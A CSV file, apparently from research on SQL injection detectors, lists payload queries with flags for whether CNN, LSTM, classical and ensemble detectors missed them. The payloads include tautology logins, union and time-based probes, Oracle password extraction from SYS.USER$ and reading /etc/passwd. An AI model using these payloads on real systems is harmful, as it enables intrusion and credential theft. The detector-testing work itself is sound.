,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
15," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'"," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,1,0,0,0,0,0
17," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1"," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",0,1,0,0,0,0,0
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1"," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",0,1,0,0,0,0,0
19,distinct,distinct,0,1,1,1,0,1,0
20,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',0,1,0,0,0,0,0
21,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116","1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,1,0,0,0,0,0
22,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,0,1,0,0,0,0,0
23,"admin"" or ""1""  =  ""1""--","admin"" or ""1""  =  ""1""--",1,1,0,0,0,0,0
24," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",0,1,0,0,0,0,0
25,insert,insert,1,1,1,1,0,1,0
26," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1"," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",0,1,0,0,0,0,0
27," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",0,1,0,0,0,0,0
28," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
29," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",0,1,0,0,0,0,0
30,"or 1  =  1 or """"  =  ","or 1  =  1 or """"  =  ",1,1,0,0,0,0,0
31,/**/or/**/1/**/  =  /**/1,/**/or/**/1/**/  =  /**/1,0,1,0,1,0,0,0
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1"," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",0,1,0,0,0,0,0
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'"," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,1,0,0,0,0,0
34," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'"," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,1,1,0,0,0,0
35,or 1  =  1/*,or 1  =  1/*,0,1,0,0,0,0,0
36,%27 or 1  =  1,%27 or 1  =  1,0,1,0,0,0,0,0
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1"," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
38," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'"," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,1,1,0,0,0,0
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",0,1,0,0,0,0,0
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'"," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,1,1,0,0,0,0
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,0,1,0,0,0,0,0
42," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'"," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",0,1,1,0,0,0,0
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1"," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,1,0,0,0,0,0
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',0,1,0,0,0,0,0
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",0,1,0,0,0,0,0
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1"," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",0,1,0,0,0,0,0
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1"," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",0,1,0,0,0,0,0
49,or 1 --',or 1 --',1,1,0,0,0,0,0
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1"," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",0,1,0,0,0,0,0
51,"admin"" or 1  =  1#","admin"" or 1  =  1#",1,1,0,0,0,0,0
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
53,\x27UNION SELECT,\x27UNION SELECT,1,0,1,1,0,1,0
54,PRINT,PRINT,0,1,1,1,0,1,0
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'"," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,1,1,0,0,0,0
56,or 1  =  1--,or 1  =  1--,0,1,0,0,0,0,0
57,1 or pg_sleep  (  __TIME__  )  --,1 or pg_sleep  (  __TIME__  )  --,0,1,0,0,0,0,0
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1"," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",0,1,0,0,0,0,0
59,admin'  )   or   (  '1'  =  '1'/*,admin'  )   or   (  '1'  =  '1'/*,1,1,0,0,0,0,0
60,or 2 between 1 and 3,or 2 between 1 and 3,0,1,1,0,0,0,0
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1"," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,1,0,0,0,0,0
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1"," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",0,1,0,0,0,0,0
63,admin' or '1'  =  '1,admin' or '1'  =  '1,1,1,0,0,0,0,0
64,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,1,0,0,0,0,0
65," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
66,""" or 0  =  0 --",""" or 0  =  0 --",0,1,0,0,0,0,0
67," select * from users where id  =  1 union select @ $_,version  (    )   -- 1"," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,1,0,0,0,0,0
68,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1,1,0,0,0,0
69," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1"," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",0,1,0,0,0,0,0
70," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1"," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,1,1,0,0,0,0
71," select * from users where id  =  1 or "",."" or 1  =  1 -- 1"," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",0,1,0,0,0,0,0
72,char%4039%41%2b%40SELECT,char%4039%41%2b%40SELECT,1,1,0,0,0,0,0
73," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",0,1,0,0,0,0,0
74,admin'  )   or   (  '1'  =  '1,admin'  )   or   (  '1'  =  '1,1,1,0,0,0,0,0
75,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,1,1,1,0,1,0
76,"or 0  =  0 #""","or 0  =  0 #""",1,1,0,0,0,0,0
77," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1"," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",0,1,0,0,0,0,0
78,  )   or   (  'x'  =  'x,  )   or   (  'x'  =  'x,1,1,0,0,0,0,0
79," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1"," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
80,$  (  sleep 50  ) ,$  (  sleep 50  ) ,0,1,0,0,0,0,0
81," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --","1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1,0,0,0,0,0
83," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1"," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",0,1,0,0,0,0,0
84," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1"," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",0,1,0,0,0,0,0
85," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1"," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",0,1,0,0,0,0,0
86,"""a"""" or 1  =  1--""","""a"""" or 1  =  1--""",1,1,0,0,0,0,0
87," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
88," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
89," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'"," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,1,1,0,0,0,0
90,1 and user_name  (    )     =   'dbo',1 and user_name  (    )     =   'dbo',1,1,0,0,0,0,0
91,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --","; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,1,0,0,0,0,0
92," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1"," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",0,1,0,0,0,0,0
93," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1"," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",0,1,0,0,0,0,0
94,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,1,0,0,0,0,0
95,select * from users where id  =  1 +$+. or 1  =  1 -- 1,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1,0,0,0,0,0
96,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,0,1,0,0,0,0,0
97," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
98,or 1  =  1 or ''  =  ',or 1  =  1 or ''  =  ',1,1,0,0,0,0,0
99,select * from users where id  =  1   or 1  =  1 -- 1,select * from users where id  =  1   or 1  =  1 -- 1,1,1,0,0,0,0,0
100,or 'text' > 't',or 'text' > 't',1,1,0,0,0,0,0
101,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055","1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,1,0,0,0,0
102," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1"," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",0,1,0,0,0,0,0
103," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1"," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",0,1,0,0,0,0,0
104,admin' or '1'  =  '1'#,admin' or '1'  =  '1'#,1,1,0,0,0,0,0
105,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,1,0,0,0,0,0
106,s,s,0,1,1,1,0,1,0
107," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
108, select * from information_schema.tables--, select * from information_schema.tables--,1,1,1,1,0,1,0
109," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",0,1,0,0,0,0,0
110,1   )    )    or pg_sleep  (  __TIME__  )  --,1   )    )    or pg_sleep  (  __TIME__  )  --,0,1,0,0,0,0,0
111," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'"," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,1,1,0,0,0,0
112,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,1,1,1,0,1,0
113, or 1  =  1 or ''  =  ', or 1  =  1 or ''  =  ',1,1,0,0,0,0,0
114,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,1,0,0,0,0,0
115,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,1,1,1,0,1,0
116," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",0,1,0,0,0,0,0
117," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1"," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",0,1,0,0,0,0,0
118,or 'unusual'   =   'unusual',or 'unusual'   =   'unusual',1,1,0,0,0,0,0
119, or 1 in   (  select @@version  )  --, or 1 in   (  select @@version  )  --,1,1,1,0,0,0,0
120,truncate,truncate,0,1,1,1,0,1,0
121,as,as,0,1,1,1,0,1,0
122, or 3  =  3 --, or 3  =  3 --,0,1,0,0,0,0,0
123," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
124," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1"," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
125,"admin""  )   or   (  ""1""  =  ""1","admin""  )   or   (  ""1""  =  ""1",1,1,0,0,0,0,0
126," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1"," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",0,1,0,0,0,0,0
127,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #","1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",0,1,0,0,0,0,0
128," select * from users where id  =  1 union select .1_,version  (    )   -- 1"," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,1,0,0,0,0,0
129, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,1,0,0,0,0,0
130," or 0  =  0 #"""," or 0  =  0 #""",1,1,0,0,0,0,0
131,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1,0,0,0,0,0
132,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,1,0,0,0,0,0
133,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --","; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,1,0,0,0,0,0
134,1  )   or sleep  (  __TIME__  )  #,1  )   or sleep  (  __TIME__  )  #,0,1,0,0,0,0,0
135," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",0,1,0,0,0,0,0
136," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1"," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,1,0,0,0,0,0
137," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1"," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",0,1,1,0,0,0,0
138,select * from users where id  =  1. <@ or 1  =  1 -- 1,select * from users where id  =  1. <@ or 1  =  1 -- 1,1,1,1,0,0,0,0
139, or true--, or true--,0,1,1,1,0,1,0
140,; execute immediate 'sel' || 'ect us' || 'er',; execute immediate 'sel' || 'ect us' || 'er',1,1,1,0,0,0,0
141,hi' or 'x'  =  'x';,hi' or 'x'  =  'x';,1,1,0,0,0,0,0
142,select * from users where id  =  1 <@ or 1  =  1 -- 1,select * from users where id  =  1 <@ or 1  =  1 -- 1,1,1,1,0,0,0,0
143," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1"," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",0,1,0,0,0,0,0
144,admin' #,admin' #,1,1,1,1,0,1,0
145," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1"," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
146," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1"," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",0,1,0,0,0,0,0
147," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1"," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",0,1,0,0,0,0,0
148," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;"," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,1,0,0,0,0,0
149,"""  )  ;waitfor delay '0:0:__TIME__'--","""  )  ;waitfor delay '0:0:__TIME__'--",0,1,0,0,0,0,0
150, or 'unusual'   =   'unusual', or 'unusual'   =   'unusual',1,1,0,0,0,0,0
151,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ","insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,1,0,0,0,0,0
152,"admin"" or ""1""  =  ""1""/*","admin"" or ""1""  =  ""1""/*",1,1,0,0,0,0,0
153," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1"," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,1,0,0,0,0,0
154," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1"," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
155,like,like,0,1,1,1,1,1,1
156,or username like char  (  37  )  ;,or username like char  (  37  )  ;,0,1,0,0,0,0,0
157, )    )    or pg_sleep  (  __TIME__  )  --, )    )    or pg_sleep  (  __TIME__  )  --,0,1,0,0,0,0,0
158,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,0,1,0,0,0,0,0
159,or 3  =  3,or 3  =  3,0,1,0,0,0,0,0
160," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1"," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",0,1,0,0,0,0,0
161,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,0,1,0,0,0,0,0
162,exec sp,exec sp,0,1,1,1,0,1,0
163," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1"," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
164,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,0,1,0,0,0,0,0
165," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1"," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,1,0,0,0,0,0
166,admin' or 1  =  1/*,admin' or 1  =  1/*,1,1,0,0,0,0,0
167,a' waitfor delay '0:0:10'--,a' waitfor delay '0:0:10'--,1,1,0,0,0,0,0
168," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1"," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,1,1,0,0,0,0
169," select * from users where id  =  1 union select .1$_,version  (    )   -- 1"," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1,0,0,0,0,0
170,and 1 in   (  select var from temp  )  --,and 1 in   (  select var from temp  )  --,1,1,0,0,0,0,0
171,hi'  )   or   (  'a'  =  'a,hi'  )   or   (  'a'  =  'a,1,1,0,0,0,0,0
172," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
173,"admin"" or 1  =  1","admin"" or 1  =  1",1,1,0,0,0,0,0
174,"""  )   or true--","""  )   or true--",0,1,0,0,0,0,0
175," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'"," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1,0,0,0,0,0
176," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",0,1,0,0,0,0,0
